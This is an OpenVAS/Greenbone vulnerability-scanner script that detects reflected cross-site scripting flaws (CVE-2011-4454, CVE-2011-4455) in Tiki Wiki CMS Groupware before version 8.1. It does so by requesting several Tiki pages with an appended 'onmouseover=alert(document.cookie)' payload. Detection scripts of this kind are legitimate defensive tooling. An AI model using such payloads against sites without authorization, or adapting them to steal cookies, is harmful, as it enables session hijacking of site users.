# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:tiki:tikiwiki_cms%2fgroupware";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802353");
  script_version("2025-03-19T05:38:35+0000");
  script_cve_id("CVE-2011-4454", "CVE-2011-4455");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2025-03-19 05:38:35 +0000 (Wed, 19 Mar 2025)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-11-21 15:23:00 +0000 (Thu, 21 Nov 2019)");
  script_tag(name:"creation_date", value:"2011-12-06 16:09:33 +0530 (Tue, 06 Dec 2011)");

  script_name("Tiki Wiki CMS Groupware < 8.1 URL Multiple XSS Vulnerabilities");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_tikiwiki_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("tiki/wiki/http/detected");

  script_xref(name:"URL", value:"http://secunia.com/advisories/46740/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50683");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/107002/sa46740.txt");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/107082/INFOSERVE-ADV2011-01.txt");

  script_tag(name:"summary", value:"Tiki Wiki CMS Groupware is prone to multiple cross-site
  scripting (XSS) vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP GET requests and checks the
  responses.");

  script_tag(name:"insight", value:"Multiple flaws are due to improper validation of input appended
  to the URL via pages 'tiki-remind_password.php', 'tiki-index.php', 'tiki-login_scr.php',
  'tiki-admin_system.php', 'tiki-pagehistory.php' and 'tiki-removepage.php', That allows attackers
  to execute arbitrary HTML and script code in a user's browser session in the context of an
  affected site.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser session in the context
  of an affected site.");

  script_tag(name:"affected", value:"Tiki Wiki CMS Groupware version 8.0.RC1 and prior.");

  script_tag(name:"solution", value:"Update to version 8.1 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

foreach page( make_list( "/tiki-index.php", "/tiki-admin_system.php",
                         "/tiki-pagehistory.php", "/tiki-login_scr.php" ) ) {

  url = dir + page + '/%22%20onmouseover=%22alert(document.cookie)%22';

  if( http_vuln_check( port:port, url:url, pattern:'php/" onmouseover="alert\\(document\\.cookie\\)"', check_header:TRUE ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
